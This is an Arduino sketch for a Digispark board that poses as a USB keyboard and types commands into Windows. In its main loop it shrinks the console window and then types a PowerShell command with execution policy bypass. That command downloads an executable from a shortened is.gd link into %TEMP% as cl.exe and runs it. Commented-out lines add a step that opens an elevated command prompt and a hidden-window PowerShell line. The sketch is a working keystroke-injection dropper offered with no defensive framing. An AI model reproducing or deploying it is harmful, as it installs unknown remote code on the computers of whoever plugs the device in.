/*
#define KEY_SINGLEQ     53 // '
#define KEYPAD_SLASH 84    // /
#define KEYPAD_BACKSLASH 100  //'/'
http://tinyurl.com
https://is.gd/
https://is.gd/MLjdNB 
powershell -windowstyle hidden -Exec ByPass -Nol
*/
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.update();
  pinMode(1, OUTPUT); //LED on Model A
  //DigiKeyboard.print("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe) else ( set PWRSHLXDD=powershell.exe)");
}

void loop()
{
  /*delay(1000);
  DigiKeyboard.update();
  delay(100);
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean it up
  DigiKeyboard.delay(50);
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT); */
  DigiKeyboard.delay(500);
  DigiKeyboard.print("mode con");
  DigiKeyboard.sendKeyStroke(KEY_SLASH, MOD_SHIFT_LEFT);
  DigiKeyboard.print("cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("color FE");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("PowerShell -ExecutionPolicy bypass -noprofile (New-Object Net.WebClient).DownloadFile(`https?");
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
  DigiKeyboard.print("is.gd");
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_ALT_RIGHT);
  DigiKeyboard.print("MLjdNB`,`%TEMP%");
     DigiKeyboard.sendKeyStroke(KEYPAD_BACKSLASH); 
  DigiKeyboard.print("cl.exe`)/Start-Process `%TEMP%");
      DigiKeyboard.sendKeyStroke(KEYPAD_BACKSLASH);
  DigiKeyboard.print("cl.exe`");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(2000);
  digitalWrite(1, LOW);
}



